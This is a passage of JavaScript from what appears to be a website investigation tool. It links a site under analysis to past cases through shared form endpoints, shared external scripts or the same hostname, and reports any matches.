        sharedFeatures.push({
          type: 'SHARED_SUBMISSION_ENDPOINT',
          description: `Identical form action destination observed: ${sharedForms.join(', ')}`
        });
      }

      // 2. Shared external script source
      const pastScripts = (pastSchema.websiteAnalysis?.scripts || []).map(s => s.src).filter(Boolean);
      const sharedScripts = currentScripts.filter(s => pastScripts.includes(s) && !s.includes('jquery') && !s.includes('bootstrap'));
      if (sharedScripts.length > 0) {
        sharedFeatures.push({
          type: 'SHARED_SCRIPT_INFRASTRUCTURE',
          description: `Same external script resource referenced: ${sharedScripts.join(', ')}`
        });
      }

      // 3. Same hostname
      if (currentHost && pastSchema.urlAnalysis?.hostname === currentHost) {
        sharedFeatures.push({
          type: 'IDENTICAL_TARGET_HOSTNAME',
          description: `Historical investigation on identical host: ${currentHost}`
        });
      }

      if (sharedFeatures.length > 0) {
        matches.push({
          caseId: pastId,
          target: pastSchema.target,
          completedAt: pastSchema.completedAt,
          riskLevel: pastSchema.assessment?.riskLevel,
          sharedFeatures
        });
      }
    }

    return {
      hasMatches: matches.length > 0,
      matches,
      explanation: matches.length > 0
        ? `Found ${matches.length} historically linked case(s) sharing infrastructure or submission endpoints.`
        : 'No correlated campaign relationships detected in local historical case store.'
    };
  }
}
